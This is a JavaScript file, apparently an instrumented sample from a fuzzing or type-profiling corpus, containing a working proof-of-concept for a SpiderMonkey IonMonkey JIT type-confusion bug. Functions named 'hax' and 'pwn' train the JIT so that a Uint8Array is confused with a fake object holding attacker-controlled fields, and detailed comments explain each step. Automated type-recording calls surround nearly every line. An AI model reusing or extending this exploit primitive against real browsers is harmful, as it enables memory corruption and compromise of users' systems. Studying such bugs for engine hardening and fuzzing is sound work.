var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
var Inst34 = 0;
var Inst35 = 0;
var Inst36 = 0;
var Inst37 = 0;
var Inst38 = 0;
var Inst39 = 0;
var Inst40 = 0;
var Inst41 = 0;
var Inst42 = 0;
var Inst43 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
try { if (Inst1 <= 1000 && typeof (ArrayBuffer) != "undefined") {_RecordType("<13,24,1>",(ArrayBuffer)); Inst1++; } } catch(e) {}
let ab = new ArrayBuffer(1024);
try { if (Inst0 <= 1000 && typeof (ab) != "undefined") {_RecordType("<4,6,1>",(ab)); Inst0++; } } catch(e) {}

try { if (Inst2 <= 1000 && typeof (hax) != "undefined") {_RecordType("<42,45,3>",(hax)); Inst2++; } } catch(e) {}
function hax(o, changeProto) {
try { if (Inst3 <= 1000 && typeof (o) != "undefined") {_RecordType("<46,47,3>",(o)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (changeProto) != "undefined") {_RecordType("<49,60,3>",(changeProto)); Inst4++; } } catch(e) {}
    // The argument type for |o| will be object of group OG1 or OG2. OG1 will
    // have the inferred types {.p: [Y]}. OG2 on the other hand will be an
    // ObjectGroup with unknown property types due to the prototype change. As
    // such, OG2 will never have any inferred property types.

    // Ultimately, this code will confuse types X and Y with each other.
    // Type X: a Uint8Array
try { if (Inst6 <= 1000 && typeof (Uint8Array) != "undefined") {_RecordType("<476,486,11>",(Uint8Array)); Inst6++; } } catch(e) {}
    let x = new Uint8Array(1024);
try { if (Inst5 <= 1000 && typeof (x) != "undefined") {_RecordType("<468,469,11>",(x)); Inst5++; } } catch(e) {}
    // Type Y: a unboxed object looking a bit like a Uint8Array but with controlled data... :)
try { if (Inst8 <= 1000 && typeof (ab) != "undefined") {_RecordType("<641,643,13>",(ab)); Inst8++; } } catch(e) {}
    let y = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
try { if (Inst7 <= 1000 && typeof (y) != "undefined") {_RecordType("<597,598,13>",(y)); Inst7++; } } catch(e) {}

try { if (Inst9 <= 1000 && typeof (changeProto) != "undefined") {_RecordType("<718,729,15>",(changeProto)); Inst9++; } } catch(e) {}
    if (changeProto) {
try { if (Inst12 <= 1000 && typeof (x) != "undefined") {_RecordType("<747,748,16>",(x)); Inst12++; } } catch(e) {}
        o.p = x;
try { if (Inst10 <= 1000 && typeof (o.p) != "undefined") {_RecordType("<741,744,16>",(o.p)); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (o) != "undefined") {_RecordType("<741,742,16>",(o)); Inst11++; } } catch(e) {}

        // This prototype change will cause a new ObjectGroup, OG_N, to be
        // allocated for o every time it is executed (because the prototype is
        // stored in the ObjectGroup). During creation of the new ObjectGroup,
        // the current property values will be used to infer property types. As
        // such, OG_N will have the inferred types {.p: [X]}.
        o.__proto__ = {};
try { if (Inst13 <= 1000 && typeof (o.__proto__) != "undefined") {_RecordType("<1134,1145,23>",(o.__proto__)); Inst13++; } } catch(e) {}try { if (Inst14 <= 1000 && typeof (o) != "undefined") {_RecordType("<1134,1135,23>",(o)); Inst14++; } } catch(e) {}
    }

    // This property write was not marked as requiring type barriers to
    // validate the consistency of inferred property types. The reason is that
    // for OG1, the property type is already correct and OG2 does not track
    // property types at all. However, IonMonkey failed to realize that the
    // ObjectGroup of o could have changed in between to a new ObjectGroup that
    // has different inferred property types. As such, the type barrier
    // omission here is unsafe.
    //
    // In the second invocation, the inline cache for this property store will
    // then be a hit (because the IC only uses the Shape to index the cache,
    // not the Group). As such, the inferred types associated with the
    // ObjectGroup for o will not be updated and will be left inconsistent.
try { if (Inst17 <= 1000 && typeof (y) != "undefined") {_RecordType("<1966,1967,38>",(y)); Inst17++; } } catch(e) {}
    o.p = y;
try { if (Inst15 <= 1000 && typeof (o.p) != "undefined") {_RecordType("<1960,1963,38>",(o.p)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (o) != "undefined") {_RecordType("<1960,1961,38>",(o)); Inst16++; } } catch(e) {}

try { if (Inst18 <= 1000 && typeof (o) != "undefined") {_RecordType("<1981,1982,40>",(o)); Inst18++; } } catch(e) {}
    return o;
}

try { if (Inst19 <= 1000 && typeof (pwn) != "undefined") {_RecordType("<1996,1999,43>",(pwn)); Inst19++; } } catch(e) {}
function pwn(o, trigger) {
try { if (Inst20 <= 1000 && typeof (o) != "undefined") {_RecordType("<2000,2001,43>",(o)); Inst20++; } } catch(e) {}try { if (Inst21 <= 1000 && typeof (trigger) != "undefined") {_RecordType("<2003,2010,43>",(trigger)); Inst21++; } } catch(e) {}
try { if (Inst22 <= 1000 && typeof (trigger) != "undefined") {_RecordType("<2022,2029,44>",(trigger)); Inst22++; } } catch(e) {}
    if (trigger) {
        // Is on a code path that wasn't executed in the interpreter so that
        // IonMonkey solely relies on type inference instead of type profiles
        // from the interpreter (which would show the real type).
try { if (Inst23 <= 1000 && typeof (o.p[0]) != "undefined") {_RecordType("<2269,2275,48>",(o.p[0])); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (o.p) != "undefined") {_RecordType("<2269,2272,48>",(o.p)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (o) != "undefined") {_RecordType("<2269,2270,48>",(o)); Inst25++; } } catch(e) {}
        return o.p[0];
    } else {
        return 42;
    }
}

// "Teach" the function hax that it should accept objects with ObjectGroup OG1.
// This is required as IonMonkey needs to have at least one "known" type when
// determining whether it can omit type barriers for property writes:
// https://github.com/mozilla/gecko-dev/blob/3ecf89da497cf1abe2a89d1b3c282b48e5dfac8c/js/src/jit/MIR.cpp#L6282
for (let i = 0; i < 10000; i++) {
try { if (Inst26 <= 1000 && typeof (i) != "undefined") {_RecordType("<2666,2667,58>",(i)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (i) != "undefined") {_RecordType("<2673,2674,58>",(i)); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (i) != "undefined") {_RecordType("<2684,2685,58>",(i)); Inst28++; } } catch(e) {}
try { if (Inst29 <= 1000 && typeof (hax) != "undefined") {_RecordType("<2695,2698,59>",(hax)); Inst29++; } } catch(e) {}
    hax({}, false);
}

// Compile hax to trigger the bug in such a way that an object will be created
// whose ObjectGroup indicates type X for property .p but whose real type will
// be Y, where both X and Y can be arbitrarily chosen.
let evilObj;
try { if (Inst30 <= 1000 && typeof (evilObj) != "undefined") {_RecordType("<2931,2938,65>",(evilObj)); Inst30++; } } catch(e) {}
for (let i = 0; i < 10000; i++) {
try { if (Inst31 <= 1000 && typeof (i) != "undefined") {_RecordType("<2949,2950,66>",(i)); Inst31++; } } catch(e) {}try { if (Inst32 <= 1000 && typeof (i) != "undefined") {_RecordType("<2956,2957,66>",(i)); Inst32++; } } catch(e) {}try { if (Inst33 <= 1000 && typeof (i) != "undefined") {_RecordType("<2967,2968,66>",(i)); Inst33++; } } catch(e) {}
try { if (Inst35 <= 1000 && typeof (hax) != "undefined") {_RecordType("<2988,2991,67>",(hax)); Inst35++; } } catch(e) {}
    evilObj = hax({}, true);
try { if (Inst34 <= 1000 && typeof (evilObj) != "undefined") {_RecordType("<2978,2985,67>",(evilObj)); Inst34++; } } catch(e) {}

    // Not sure why this is required here, it maybe prevents JITing of the main
    // script or similar...
try { if (Inst36 <= 1000 && typeof (eval) != "undefined") {_RecordType("<3116,3120,71>",(eval)); Inst36++; } } catch(e) {}
    eval('evilObj.p');
}

// JIT compile the second function and make it rely on the (incorrect) type
// inference data to omit runtime type checks.
for (let i = 0; i < 100000; i++) {
try { if (Inst37 <= 1000 && typeof (i) != "undefined") {_RecordType("<3270,3271,76>",(i)); Inst37++; } } catch(e) {}try { if (Inst38 <= 1000 && typeof (i) != "undefined") {_RecordType("<3277,3278,76>",(i)); Inst38++; } } catch(e) {}try { if (Inst39 <= 1000 && typeof (i) != "undefined") {_RecordType("<3289,3290,76>",(i)); Inst39++; } } catch(e) {}
try { if (Inst40 <= 1000 && typeof (pwn) != "undefined") {_RecordType("<3300,3303,77>",(pwn)); Inst40++; } } catch(e) {}try { if (Inst41 <= 1000 && typeof (evilObj) != "undefined") {_RecordType("<3304,3311,77>",(evilObj)); Inst41++; } } catch(e) {}
    pwn(evilObj, false);
}

// Finally trigger a type confusion.
try { if (Inst42 <= 1000 && typeof (pwn) != "undefined") {_RecordType("<3361,3364,81>",(pwn)); Inst42++; } } catch(e) {}try { if (Inst43 <= 1000 && typeof (evilObj) != "undefined") {_RecordType("<3365,3372,81>",(evilObj)); Inst43++; } } catch(e) {}
pwn(evilObj, true);

